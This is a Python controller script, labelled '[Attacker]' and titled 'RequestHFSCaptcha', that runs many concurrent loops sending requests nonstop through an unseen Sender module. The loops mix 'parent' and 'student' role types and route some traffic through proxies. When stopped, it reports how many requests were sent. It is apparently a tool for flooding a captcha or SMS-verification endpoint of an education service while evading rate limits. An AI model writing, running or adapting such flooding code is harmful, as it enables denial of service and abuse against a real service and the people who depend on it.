#-*- coding:utf-8 -*-
import sys,os,asyncio,logging
#把当前目录添加到模块搜索路径
sys.path.append(os.getcwd())
import Sender
#是否正在运行
running=True
#一直发送请求,直到running为False时退出
async def SendLoop(Send):
    while running:
        try:
            await Send()
        except Exception as a:
            debug(a)
#按回车退出
def WaitForExit():
    input("[Attacker][小心误触]按回车退出\n")
    global running
    running=False
    print("[Attacker]等待Sender关闭...")
async def Main():
    print("RequestHFSCaptcha By hg56th56gd6g")
    print("[Attacker]初始化中...")
    #注:此处的赋值没有作用,默认同时运行16个,12个代理4个不代理,超时10秒,不debug
    count=16
    proxy=12
    timeout=10
    #解析命令行python Control.py <协程并发数> <几个并发使用代理> <网络timeout时间(秒)> [<是否debug>]
    count=int(sys.argv[1])
    proxy=int(sys.argv[2])
    timeout=float(sys.argv[3])
    #debug
    global debug
    debug=logging.getLogger("RequestHFSCaptcha")
    debug.addHandler(logging.StreamHandler(sys.stdout))
    if 5<=len(sys.argv) and sys.argv[4]=="True":
        debug.setLevel(logging.DEBUG)
    debug=debug.debug
    #检查参数
    if not (1<=count and 0<=timeout and 0<=proxy<=count):
        print("参数错误")
    #学生家长对半分
    roleType=count//2
    #创建count个SendLoop,等待它们全部退出
    connects=[]
    tasks=[]
    for a in range(count):
        #如果还剩家长类型
        if roleType:
            roleType-=1
            #如果还剩要使用代理
            if proxy:
                proxy-=1
                #家长类型,使用代理
                connects.append(Sender.Sender(
                    timeout,
                    Sender.ROLETYPE_PARENT,
                    True
                ))
                debug("start SendLoop with proxy,roleType=PARENT")
            else:
                #家长类型,不使用代理
                connects.append(Sender.Sender(
                    timeout,
                    Sender.ROLETYPE_PARENT,
                    False
                ))
                debug("start SendLoop,roleType=PARENT")
        else:
            #如果还剩要使用代理
            if proxy:
                proxy-=1
                #学生类型,使用代理
                connects.append(Sender.Sender(
                    timeout,
                    Sender.ROLETYPE_STUDENT,
                    True
                ))
                debug("start SendLoop with proxy,roleType=STUDENT")
            else:
                #学生类型,不使用代理
                connects.append(Sender.Sender(
                    timeout,
                    Sender.ROLETYPE_STUDENT,
                    False
                ))
                debug("start SendLoop,roleType=STUDENT")
        #对每个连接创建SendLoop
        tasks.append(SendLoop(connects[a].Send))
    #把等待退出也加入任务(新线程运行),这里create_task是让他先运行
    tasks.append(asyncio.create_task(asyncio.to_thread(WaitForExit)))
    #清理一下变量
    del count,timeout,proxy,roleType
    await asyncio.gather(*tasks)
    print(sum(a.count for a in connects))
if __name__=="__main__":
    asyncio.run(Main())